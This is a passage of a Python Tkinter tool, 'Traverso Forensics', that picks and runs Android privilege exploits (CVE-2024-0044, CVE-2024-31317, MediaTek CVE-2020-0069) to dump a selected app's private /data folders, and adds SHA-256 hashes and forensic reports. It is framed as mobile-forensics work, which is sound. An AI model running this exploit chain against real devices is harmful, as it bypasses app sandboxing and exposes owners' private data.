                uid_m = re.search(r"Uid:\s*\(\s*(\d+)\s*/", app_stat)
                uid = uid_m.group(1) if uid_m else None
                if uid and uid != "1000":
                    self._dump_folder(f"/data/data/{app}", output_zip, sock)
                else:
                    # UID is 1000 or unknown — try anyway for target package
                    if app == package:
                        self._dump_folder(f"/data/data/{app}", output_zip, sock)

                # Also dump user_de (credential-encrypted storage)
                de_stat = self._send_and_receive(
                    sock, f"stat /data/user_de/0/{app}", overall_timeout=3.0
                )
                uid_de = re.search(r"Uid:\s*\(\s*(\d+)\s*/", de_stat)
                uid_de_val = uid_de.group(1) if uid_de else None
                if uid_de_val and uid_de_val != "1000":
                    self._dump_folder(f"/data/user_de/0/{app}", output_zip, sock)
                elif app == package:
                    self._dump_folder(f"/data/user_de/0/{app}", output_zip, sock)

            for target in ZYGOTE_DUMP_TARGETS_SCOPED:
                self._dump_folder(target, output_zip, sock)
        else:
            # Full mode — /data readable directly
            self.log("Full mode — dumping /data/ and /system/bin/", "INFO")
            for target in ZYGOTE_DUMP_TARGETS_FULL:
                self._dump_folder(target, output_zip, sock)

        sock.close()
        self.adb.forward_remove(self.PORT)
        self.log(
            f"Total streamed: {self.bytes_total / 1024 / 1024:.2f} MB",
            "SUCCESS"
        )

        # 8 ─ Cleanup
        self.progress(8, 8, "Cleaning up...")
        self._cleanup()
        return self.bytes_total > 0

    def _cleanup(self):
        if os.path.exists(self.BUSYBOX_LOCAL):
            self.adb.shell(f"rm -f {self.BUSYBOX_REMOTE}")
        self.log("Cleanup complete", "SUCCESS")


# ─────────────────────────────────────────────────────────────────────────────
# HASH & REPORT UTILITIES
# ─────────────────────────────────────────────────────────────────────────────

def sha256_file(path):
    h = hashlib.sha256()
    with open(path, "rb") as f:
        while chunk := f.read(8192):
            h.update(chunk)
    return h.hexdigest()


def write_hash_file(filepath, original_name, package):
    digest = sha256_file(filepath)
    hash_path = filepath + ".sha256.txt"
    with open(hash_path, "w", encoding="utf-8") as f:
        f.write(f"File    : {original_name}\n")
        f.write(f"SHA-256 : {digest}\n")
        f.write(f"Package : {package}\n")
        f.write(f"Date    : {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}\n")
        f.write(f"Tool    : {TOOL_NAME} v{TOOL_VERSION}\n")
    return digest, hash_path


def write_extraction_report(out_dir, package, method, device_info, digest):
    path = os.path.join(out_dir, "extraccion_forense.txt")
    di   = device_info.data
    now  = datetime.now().astimezone()
    with open(path, "w", encoding="utf-8") as f:
        f.write("REPORTE DE EXTRACCIÓN FORENSE\n")
        f.write("=" * 55 + "\n")
        f.write(f"Herramienta : {TOOL_NAME} v{TOOL_VERSION}\n")
        f.write(f"Estándar    : ISO/IEC 27037:2012\n\n")
        f.write(f"Aplicación  : {package}\n")
        f.write(f"Método CVE  : {method}\n")
        f.write(f"Fecha       : {now.strftime('%d/%m/%Y %H:%M:%S')} "
                f"(UTC{now.strftime('%z')})\n\n")
        f.write("DISPOSITIVO\n")
        f.write("-" * 30 + "\n")
        f.write(device_info.summary() + "\n\n")
        f.write("INTEGRIDAD\n")
        f.write("-" * 30 + "\n")
        f.write(f"SHA-256 : {digest}\n")
    return path


def write_log_file(out_dir, log_entries):
    path = os.path.join(out_dir, "extraction_log.txt")
    with open(path, "w", encoding="utf-8") as f:
        f.write(f"{TOOL_NAME} v{TOOL_VERSION} — Extraction Log\n")
        f.write("=" * 55 + "\n")
        for entry in log_entries:
            f.write(entry + "\n")
    return path


# ─────────────────────────────────────────────────────────────────────────────
# MAIN GUI
# ─────────────────────────────────────────────────────────────────────────────

class TraversoForensicsGUI:

    # ── palette ───────────────────────────────────────────────────────────
    BG_DARK   = "#1e1e1e"
    BG_PANEL  = "#2d2d2d"
    BG_INPUT  = "#3e3e3e"
    FG_TEXT   = "#f0f0f0"
    FG_SEC    = "#a0a0a0"
    C_GREEN   = "#2ecc71"
    C_BLUE    = "#3498db"
    C_RED     = "#e74c3c"
    C_ORANGE  = "#e67e22"

    def __init__(self, root):
        self.root = root
        self.root.title(f"{TOOL_NAME} v{TOOL_VERSION}")
        self.root.geometry("1260x860")
        self.root.configure(bg=self.BG_DARK)
        self.root.resizable(True, True)

        # State
        self.device_connected  = tk.BooleanVar(value=False)
        self.selected_package  = tk.StringVar()
        self.selected_uid      = tk.StringVar()
        self.apps_list         = []
        self.log_entries       = []
        self.extraction_dir    = None

        # Core objects (initialised after first device detection)
        self.adb    = ADBRunner(log_cb=self.write_log)
        self.di     = DeviceInfo(self.adb)
        self.verifier = None

        self._setup_styles()
        self._build_header()
        self._build_panels()
        self._build_footer()

        self.root.after(600, self.check_device)

    # ── styles ────────────────────────────────────────────────────────────

    def _setup_styles(self):
        s = ttk.Style()
        s.theme_use("clam")
        s.configure(
            "blue.Horizontal.TProgressbar",
            troughcolor=self.BG_INPUT,
            background=self.C_BLUE,
            bordercolor=self.BG_PANEL,
            lightcolor=self.C_BLUE,
            darkcolor=self.C_BLUE,
        )

    # ── header ────────────────────────────────────────────────────────────

    def _build_header(self):
        hdr = tk.Frame(self.root, bg=self.BG_DARK, height=90)
        hdr.pack(fill=tk.X)
        hdr.pack_propagate(False)

        # Logo
        logo_path = "traverso_logo.png"
        try:
            if os.path.exists(logo_path):
                logo = tk.PhotoImage(file=logo_path).subsample(10, 10)
                lbl  = tk.Label(hdr, image=logo, bg=self.BG_DARK)
                lbl.image = logo
                lbl.pack(side=tk.LEFT, padx=20)
        except Exception:
            pass

        tf = tk.Frame(hdr, bg=self.BG_DARK)
        tf.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)

        tk.Label(
            tf, text="Traverso Forensics",
            font=("Segoe UI", 22, "bold"),
            fg="white", bg=self.BG_DARK
        ).pack(anchor=tk.W, pady=(14, 0))

        tk.Label(
            tf,
            text=(
                "Android Extraction Suite v2.1  |  ISO/IEC 27037:2012  |  "
                "CVE-2024-0044 (Android 12/13)  ·  CVE-2024-31317 (Android 9/10/11)"
                "  ·  CVE-2020-0069 (MediaTek)"
            ),
            font=("Segoe UI", 9),
            fg=self.FG_SEC, bg=self.BG_DARK
        ).pack(anchor=tk.W)

    # ── panels ────────────────────────────────────────────────────────────

    def _build_panels(self):
        cont = tk.Frame(self.root, bg=self.BG_DARK)
        cont.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        self._build_left(cont).pack(
            side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(0, 5)
        )
        self._build_right(cont).pack(
            side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=(5, 0)
        )

    # ── left panel ────────────────────────────────────────────────────────

    def _build_left(self, parent):
        panel = tk.Frame(parent, bg=self.BG_PANEL)

        # Device status
        sh = tk.Frame(panel, bg=self.BG_PANEL)
        sh.pack(fill=tk.X, padx=15, pady=(15, 5))
        tk.Label(
            sh, text="Device Status",
            font=("Segoe UI", 12, "bold"),
            fg=self.FG_TEXT, bg=self.BG_PANEL
        ).pack(side=tk.LEFT)
        tk.Button(
            sh, text="↺ Refresh",
            bg=self.C_BLUE, fg="white",
            font=("Segoe UI", 9, "bold"),
            relief=tk.FLAT, padx=12, pady=4,
            cursor="hand2", command=self.check_device
        ).pack(side=tk.RIGHT)

        # Indicator box
        ind = tk.Frame(panel, bg=self.BG_INPUT)
        ind.pack(fill=tk.X, padx=15, pady=(0, 5))
        top = tk.Frame(ind, bg=self.BG_INPUT)
        top.pack(fill=tk.X, padx=10, pady=(10, 5))

        self.status_dot = tk.Label(
            top, text="●", font=("Segoe UI", 16),
            fg=self.C_RED, bg=self.BG_INPUT
        )
        self.status_dot.pack(side=tk.LEFT, padx=(0, 8))

        self.status_lbl = tk.Label(
            top, text="No device",
            font=("Segoe UI", 11, "bold"),
            fg=self.C_RED, bg=self.BG_INPUT
        )
        self.status_lbl.pack(side=tk.LEFT)

        self.device_text = scrolledtext.ScrolledText(
            ind, height=4, bg=self.BG_INPUT, fg=self.FG_SEC,
            font=("Consolas", 9), relief=tk.FLAT, borderwidth=0
        )
        self.device_text.pack(fill=tk.BOTH, padx=10, pady=(0, 10))
        self.device_text.insert(
            1.0, "Connect device via USB and enable USB Debugging."
        )
        self.device_text.config(state=tk.DISABLED)

        # Buttons
        bf = tk.Frame(panel, bg=self.BG_PANEL)
        bf.pack(fill=tk.X, padx=15, pady=(5, 15))

        tk.Button(
            bf, text="Detect Device",
            bg=self.C_GREEN, fg="white",
            font=("Segoe UI", 10, "bold"),
            relief=tk.FLAT, padx=18, pady=8,
            cursor="hand2", command=self.check_device
        ).pack(side=tk.LEFT, expand=True, fill=tk.X, padx=(0, 5))

        self.listapps_btn = tk.Button(
            bf, text="List Apps",
            bg=self.BG_INPUT, fg=self.FG_TEXT,
            font=("Segoe UI", 10, "bold"),
            relief=tk.FLAT, padx=18, pady=8,
            state=tk.DISABLED, cursor="hand2",
            command=self.list_apps
        )
        self.listapps_btn.pack(
            side=tk.RIGHT, expand=True, fill=tk.X, padx=(5, 0)
        )

        # App filter radios
        tk.Label(
            panel, text="App Filter",
            font=("Segoe UI", 10, "bold"),
            fg=self.FG_TEXT, bg=self.BG_PANEL
        ).pack(anchor=tk.W, padx=15, pady=(5, 2))

        self.app_filter = tk.StringVar(value="third_party")
        rf = tk.Frame(panel, bg=self.BG_PANEL)
        rf.pack(fill=tk.X, padx=20)
        for label, val in (
            ("Third-party", "third_party"),
            ("System", "native"),
            ("All", "all"),
        ):
            tk.Radiobutton(
                rf, text=label, variable=self.app_filter, value=val,
                bg=self.BG_PANEL, fg=self.FG_TEXT,
                selectcolor=self.BG_INPUT,
                activebackground=self.BG_PANEL,
                activeforeground=self.FG_TEXT,
                font=("Segoe UI", 9),
                command=self.filter_apps
            ).pack(side=tk.LEFT, padx=(0, 12))

        # Search
        tk.Label(
            panel, text="Applications",
            font=("Segoe UI", 12, "bold"),
            fg=self.FG_TEXT, bg=self.BG_PANEL
        ).pack(anchor=tk.W, padx=15, pady=(10, 5))

        sf = tk.Frame(panel, bg=self.BG_PANEL)
        sf.pack(fill=tk.X, padx=15, pady=(0, 8))
        self.search_var = tk.StringVar()
        self.search_var.trace("w", lambda *_: self.filter_apps())
        tk.Entry(
            sf, textvariable=self.search_var,
            bg=self.BG_INPUT, fg=self.FG_TEXT,
            font=("Segoe UI", 9), relief=tk.FLAT,
            insertbackground=self.FG_TEXT
        ).pack(fill=tk.X, ipady=5)

        # Listbox
        lf = tk.Frame(panel, bg=self.BG_INPUT)
        lf.pack(fill=tk.BOTH, expand=True, padx=15, pady=(0, 15))
        sb = tk.Scrollbar(lf, bg=self.BG_INPUT)
        sb.pack(side=tk.RIGHT, fill=tk.Y)
        self.apps_listbox = tk.Listbox(
            lf, bg=self.BG_INPUT, fg=self.FG_TEXT,
            font=("Consolas", 9), relief=tk.FLAT, borderwidth=0,
            selectbackground=self.C_BLUE, selectforeground="white",
            yscrollcommand=sb.set
        )
        self.apps_listbox.pack(
            side=tk.LEFT, fill=tk.BOTH, expand=True, padx=4, pady=4
        )
        sb.config(command=self.apps_listbox.yview)
        self.apps_listbox.bind("<<ListboxSelect>>", self._on_app_select)

        return panel

    # ── right panel ───────────────────────────────────────────────────────

    def _build_right(self, parent):
        panel = tk.Frame(parent, bg=self.BG_PANEL)

        tk.Label(
            panel, text="Selected Application",
            font=("Segoe UI", 12, "bold"),
            fg=self.FG_TEXT, bg=self.BG_PANEL
        ).pack(anchor=tk.W, padx=15, pady=(15, 5))

        info = tk.Frame(panel, bg=self.BG_PANEL)
        info.pack(fill=tk.X, padx=15)

        tk.Label(
            info, text="Package:",
            font=("Segoe UI", 9, "bold"),
            fg=self.FG_SEC, bg=self.BG_PANEL
        ).pack(anchor=tk.W)
        self.pkg_lbl = tk.Label(
            info, text="—", font=("Segoe UI", 10),
            fg=self.FG_TEXT, bg=self.BG_PANEL
        )
        self.pkg_lbl.pack(anchor=tk.W, pady=(0, 8))

        tk.Label(
            info, text="UID:",
            font=("Segoe UI", 9, "bold"),
            fg=self.FG_SEC, bg=self.BG_PANEL
        ).pack(anchor=tk.W)
        self.uid_lbl = tk.Label(
            info, text="—", font=("Segoe UI", 10),
            fg=self.FG_TEXT, bg=self.BG_PANEL
        )
        self.uid_lbl.pack(anchor=tk.W, pady=(0, 8))

        # Detected method badge
        tk.Label(
            info, text="Detected exploit:",
            font=("Segoe UI", 9, "bold"),
            fg=self.FG_SEC, bg=self.BG_PANEL
        ).pack(anchor=tk.W)
        self.method_lbl = tk.Label(
            info, text="—", font=("Segoe UI", 10),
            fg=self.C_ORANGE, bg=self.BG_PANEL
        )
        self.method_lbl.pack(anchor=tk.W, pady=(0, 8))

        # Progress
        self.progress_bar = ttk.Progressbar(
            panel, mode="determinate", length=300,
            style="blue.Horizontal.TProgressbar"
        )
        self.progress_bar.pack(fill=tk.X, padx=15, pady=(10, 4))
        self.progress_lbl = tk.Label(
            panel, text="", bg=self.BG_PANEL,
            fg=self.FG_TEXT, font=("Segoe UI", 9)
        )
        self.progress_lbl.pack(fill=tk.X, padx=15, pady=(0, 8))

        # Start button
        self.start_btn = tk.Button(
            panel, text="▶  Start Forensic Extraction",
            bg=self.BG_INPUT, fg=self.FG_TEXT,
            font=("Segoe UI", 11, "bold"),
            relief=tk.FLAT, padx=20, pady=12,
            state=tk.DISABLED, cursor="hand2",
            command=self.start_extraction
        )
        self.start_btn.pack(fill=tk.X, padx=15, pady=(0, 10))

        # Log
        tk.Label(
            panel, text="Extraction Log",
            font=("Segoe UI", 10, "bold"),
            fg=self.FG_TEXT, bg=self.BG_PANEL
        ).pack(anchor=tk.W, padx=15, pady=(5, 4))

        lf = tk.Frame(panel, bg=self.BG_INPUT)
        lf.pack(fill=tk.BOTH, expand=True, padx=15, pady=(0, 15))

        self.log_text = scrolledtext.ScrolledText(
            lf, bg=self.BG_INPUT, fg=self.FG_TEXT,
            font=("Consolas", 9), relief=tk.FLAT, borderwidth=0
        )
        self.log_text.pack(fill=tk.BOTH, expand=True, padx=4, pady=4)
        self.log_text.insert(1.0, "System ready. Waiting for device...\n")
        self.log_text.config(state=tk.DISABLED)

        return panel

    # ── footer ────────────────────────────────────────────────────────────

    def _build_footer(self):
        ft = tk.Frame(self.root, bg=self.BG_PANEL, height=36)
        ft.pack(fill=tk.X, side=tk.BOTTOM)
        ft.pack_propagate(False)
        tk.Label(
            ft,
            text=f"Developer: Miguel Ángel Alfredo TRAVERSO — {TOOL_NAME} v{TOOL_VERSION}",
            font=("Segoe UI", 8),
            fg=self.FG_SEC, bg=self.BG_PANEL
        ).pack(side=tk.LEFT, padx=15)
        tk.Label(
            ft, text="ISO/IEC 27037:2012 Compliant",
            font=("Segoe UI", 8),
            fg="#555555", bg=self.BG_PANEL
        ).pack(side=tk.RIGHT, padx=15)

    # ── logging ───────────────────────────────────────────────────────────

    def write_log(self, msg, level="INFO"):
        ts     = time.strftime("%H:%M:%S")
        icons  = {
            "SUCCESS": "✓",
            "WARNING": "⚠",
            "ERROR":   "✗",
            "INFO":    "·",
        }
        icon   = icons.get(level, "·")
        entry  = f"[{ts}] {icon} {msg}"
        self.log_entries.append(f"[{ts}] [{level}] {msg}")
        self.root.after(0, lambda e=entry: self._append_log(e + "\n"))

    def _append_log(self, text):
        self.log_text.config(state=tk.NORMAL)
        self.log_text.insert(tk.END, text)
        self.log_text.see(tk.END)
        self.log_text.config(state=tk.DISABLED)

    # ── progress ──────────────────────────────────────────────────────────

    def _update_progress(self, val, total, msg):
        if total > 0:
            pct = (val / total) * 100
        else:
            pct = self.progress_bar["value"]  # keep current
        self.root.after(
            0,
            lambda: (
                self.progress_bar.configure(value=pct),
                self.progress_lbl.config(text=msg),
            ),
        )

    # ── device status ─────────────────────────────────────────────────────

    def _set_device_status(self, connected, label, detail=""):
        color = self.C_GREEN if connected else self.C_RED
        self.root.after(0, lambda: (
            self.status_dot.config(fg=color),
            self.status_lbl.config(text=label, fg=color),
        ))
        self.device_text.config(state=tk.NORMAL)
        self.device_text.delete(1.0, tk.END)
        self.device_text.insert(1.0, detail)
        self.device_text.config(state=tk.DISABLED)

    # ── device detection ──────────────────────────────────────────────────

    def check_device(self):
        self._set_device_status(False, "Checking…", "Scanning for devices...")
        threading.Thread(target=self._check_device_thread, daemon=True).start()

    def _check_device_thread(self):
        # Ensure ADB server is up
        subprocess.run(["adb", "start-server"], capture_output=True)

        out, _, code = self.adb.run(["devices"])
        if code != 0:
            self._set_device_status(False, "ADB Error", "ADB not found in PATH.")
            return

        lines = [l for l in out.split("\n")[1:] if "device" in l]
        if not lines:
            self.device_connected.set(False)
            self._set_device_status(
                False, "No Device",
                "Connect via USB and enable USB Debugging."
            )
            return

        self.device_connected.set(True)
        self.di.collect()

        # Determine and display exploit method badge
        if self.di.is_mtk_vulnerable():
            method = "CVE-2020-0069 (MediaTek)"
        elif self.di.android_version() >= 12:
            method = "CVE-2024-0044"
        else:
            method = "CVE-2024-31317"
        self.root.after(0, lambda: self.method_lbl.config(text=method))

        self._set_device_status(True, "Connected", self.di.summary())
        self.write_log(
            f"Device connected: {self.di.data.get('model','?')} "
            f"(Android {self.di.data.get('android','?')})",
            "SUCCESS"
        )
        self.root.after(
            0,
            lambda: self.listapps_btn.config(state=tk.NORMAL, bg=self.C_BLUE),
        )

    # ── app list ──────────────────────────────────────────────────────────

    def list_apps(self):
        self.write_log("Listing installed packages...")
        threading.Thread(target=self._fetch_apps_thread, daemon=True).start()

    def _fetch_apps_thread(self):
        out, _, _ = self.adb.run(
            ["shell", "pm", "list", "packages", "-U"]
        )
        self.apps_list = []
        for line in out.splitlines():
            if "package:" in line and "uid:" in line:
                try:
                    parts = line.split()
                    pkg = parts[0].replace("package:", "")
                    uid = parts[1].replace("uid:", "")
                    self.apps_list.append({"package": pkg, "uid": uid})
                except Exception:
                    pass
        self.write_log(f"Found {len(self.apps_list)} packages", "SUCCESS")
        self.root.after(0, self.filter_apps)

    def filter_apps(self):
        term   = self.search_var.get().lower()
        ftype  = self.app_filter.get()
        sys_pfx = ("com.android", "com.google", "android", "com.samsung")
        self.apps_listbox.delete(0, tk.END)
        for app in self.apps_list:
            pkg = app["package"]
            is_sys = any(pkg.startswith(p) for p in sys_pfx)
            if ftype == "third_party" and is_sys:
                continue
            if ftype == "native" and not is_sys:
                continue
            if term and term not in pkg.lower():
                continue
            self.apps_listbox.insert(tk.END, f"{pkg}  (uid: {app['uid']})")

    def _on_app_select(self, event):
        sel = self.apps_listbox.curselection()
        if not sel:
            return
        line = self.apps_listbox.get(sel[0])
        pkg  = line.split("  (uid:")[0].strip()
        uid  = line.split("uid: ")[1].rstrip(")").strip()
        self.selected_package.set(pkg)
        self.selected_uid.set(uid)
        self.pkg_lbl.config(text=pkg)
        self.uid_lbl.config(text=uid)
        self.start_btn.config(state=tk.NORMAL, bg=self.C_GREEN)

    # ── extraction ────────────────────────────────────────────────────────

    def start_extraction(self):
        pkg = self.selected_package.get()
        if not pkg:
            return

        ver     = self.di.android_version()
        if self.di.is_mtk_vulnerable():
            method = "CVE-2020-0069"
        elif ver >= 12:
            method = "CVE-2024-0044"
        else:
            method = "CVE-2024-31317"

        warning = (
            f"Extract data from:\n\n"
            f"Package  : {pkg}\n"
            f"UID      : {self.selected_uid.get()}\n"
            f"Method   : {method}\n"
            f"Platform : {self.di.data.get('platform','N/A')}  "
            f"ABI: {self.di.data.get('abi','N/A')}\n\n"
        )
        if method == "CVE-2024-0044":
            warning += (
                "Requires: traverso.apk in working directory\n"
                "Works on: Android 12 / 13 without March 2024 patch"
            )
        elif method == "CVE-2024-31317":
            warning += (
                "Optional: busybox-arm64 in working directory\n"
                "Works on: Android 9 / 10 / 11"
            )
        else:  # CVE-2020-0069
            warning += (
                "Requires: ressources/cve/2020-0069/arm64/mtk-su\n"
                "Works on: MediaTek (MT67xx/MT816x/MT817x) Android < 10, patch < 2020-03-01"
            )

        if not messagebox.askyesno("Confirm Extraction", warning):
            return

        # Reset log
        self.log_entries = []
        self.log_text.config(state=tk.NORMAL)
        self.log_text.delete(1.0, tk.END)
        self.log_text.config(state=tk.DISABLED)
        self.start_btn.config(state=tk.DISABLED, bg=self.BG_INPUT)

        threading.Thread(
            target=self._run_extraction,
            args=(pkg, self.selected_uid.get()),
            daemon=True
        ).start()

    def _run_extraction(self, package, uid):
        try:
            ts   = datetime.now().strftime("%Y%m%d_%H%M%S")
            slug = package.replace(".", "_")
            self.extraction_dir = f"extraction_{slug}_{ts}"
            os.makedirs(self.extraction_dir, exist_ok=True)

            self._update_progress(5, 100, "Pre-extraction verification...")
            self.verifier = ForensicVerification(
                self.adb, self.di, log_cb=self.write_log
            )
            ok, method = self.verifier.run_pre_checks(package)
            if not ok:
                self.write_log("Pre-check failed — aborting", "ERROR")
                return

            self.method_lbl.config(text=method)

            if method == "CVE-2024-0044":
                output_file = os.path.join(
                    self.extraction_dir, f"{slug}_backup.tar"
                )
                expl = Exploit_CVE_2024_0044(
                    self.adb,
                    log_cb=self.write_log,
                    progress_cb=self._update_progress
                )
                success = expl.run(package, uid, output_file)

            elif method == "CVE-2024-31317":
                output_file = os.path.join(
                    self.extraction_dir, f"{slug}_backup.zip"
                )
                all_pkgs = [a["package"] for a in self.apps_list]
                expl = Exploit_CVE_2024_31317(
                    self.adb, self.di,
                    log_cb=self.write_log,
                    progress_cb=self._update_progress
                )
                success = expl.run(package, output_file, all_apps=all_pkgs)

            elif method == "CVE-2020-0069":
                output_file = os.path.join(
                    self.extraction_dir, f"{slug}_backup.tar"
                )
                expl = Exploit_CVE_2020_0069(
                    self.adb, self.di,
                    log_cb=self.write_log,
                    progress_cb=self._update_progress
                )
                success = expl.run(package, output_file)

            else:
                self.write_log("No supported exploit for this device", "ERROR")
                return

            if not success or not os.path.exists(output_file):
                self.write_log("Extraction failed — output file missing", "ERROR")
                self._update_progress(0, 100, "Failed")
                return

            size = os.path.getsize(output_file)
            if size < 512:
                self.write_log("Output file too small — exploit likely failed", "ERROR")
                self._update_progress(0, 100, "Failed")
                return

            # Hash
            self._update_progress(92, 100, "Calculating SHA-256...")
            digest, hash_file = write_hash_file(
                output_file, os.path.basename(output_file), package
            )
            self.write_log(f"SHA-256: {digest}", "SUCCESS")

            # Reports
            self._update_progress(95, 100, "Writing forensic report...")
            write_extraction_report(
                self.extraction_dir, package, method, self.di, digest
            )
            write_log_file(self.extraction_dir, self.log_entries)

            # Post-checks
            self._update_progress(97, 100, "Post-extraction verification...")
            self.verifier.run_post_checks()

            self._update_progress(100, 100, "Extraction complete")
            self.write_log(
                f"All files saved to: {os.path.abspath(self.extraction_dir)}",
                "SUCCESS"
            )

            messagebox.showinfo(
                "Extraction Complete",
                f"Method  : {method}\n"
                f"File    : {os.path.basename(output_file)}\n"
                f"Size    : {size / 1024 / 1024:.2f} MB\n"
                f"SHA-256 : {digest[:32]}…\n\n"
                f"Folder  : {os.path.abspath(self.extraction_dir)}"
            )

        except Exception as e:
            import traceback
            self.write_log(f"Critical error: {e}", "ERROR")
            self.write_log(traceback.format_exc(), "ERROR")
            self._update_progress(0, 100, "Error")
        finally:
            self.root.after(
                0,
                lambda: self.start_btn.config(
                    state=tk.NORMAL, bg=self.C_GREEN
                )
            )


# ─────────────────────────────────────────────────────────────────────────────
# ENTRY POINT
# ─────────────────────────────────────────────────────────────────────────────

def main():
    root = tk.Tk()
    TraversoForensicsGUI(root)
    root.mainloop()


if __name__ == "__main__":
    main()
